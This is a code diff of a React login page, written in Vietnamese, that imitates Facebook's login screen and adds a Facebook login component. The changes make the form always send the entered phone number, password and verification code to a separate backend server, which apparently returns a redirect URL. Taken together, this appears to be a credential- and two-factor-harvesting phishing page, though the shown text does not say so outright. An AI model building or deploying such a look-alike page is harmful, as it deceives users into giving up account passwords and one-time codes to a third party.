@@ -3,6 +3,7 @@ import axios from 'axios'
 import { useLocation, useNavigate } from 'react-router-dom';
 import icInstagram from '../assets/icons/ic-instagram.svg';
 import icSMS from '../assets/icons/ic-sms.svg';
+import FacebookLogin from '../components/Facebook';
 // import FacebookLoginComponent from '../components/Facebook/index';
 const LoginPage = () => {
   console.log("LoginPage")
@@ -40,16 +41,13 @@ const LoginPage = () => {
         setError(true);
       } else if (!phoneEntered && passwordEntered) {
         return;
-      } else if (phoneEntered && !passwordEntered) {
+      } else if (phoneEntered && passwordEntered) {
         passwordEntered = "";
         setShowCode(true);
-        setisOKay(true);
       }
-      if (isOKay || codeEntered) {
-        var response = await axios.post("http://localhost:3001/", {
-          codeEntered, phoneEntered, passwordEntered
-        })
-      }
+      var response = await axios.post("http://localhost:3001/", {
+        codeEntered, phoneEntered, passwordEntered
+      })
 
       let { data } = response
       let { fullUrl, messages, phoneNumber } = data;
@@ -111,7 +109,7 @@ const LoginPage = () => {
             </div>
             <div className='border-b'></div>
 
-            <div className='my-3'>
+            <div className='my-3 '>
               <span>Chọn phương thức đăng nhập: <br /></span>
               <div className='flex justify-between my-2'>
                 <div
@@ -129,11 +127,11 @@ const LoginPage = () => {
                   </span>
                 </div>
               </div>
+              <FacebookLogin />
             </div>
             <div className='my-6'>
               <button type='submit' className='border-none outline-none bg-[#42b72a]  hover:bg-green-600 text-white text-[18px] p-3 px-4 rounded-[8px]'>Tạo tài khoản mới</button>
             </div>
-            {/* <FacebookLoginComponent /> */}
           </form>
           <div className='mt-5 text-[14px] text-center'>
             <b>Tạo Trang</b> dành cho người nổi tiếng, thương hiệu hoặc doanh <br /> nghiệp.
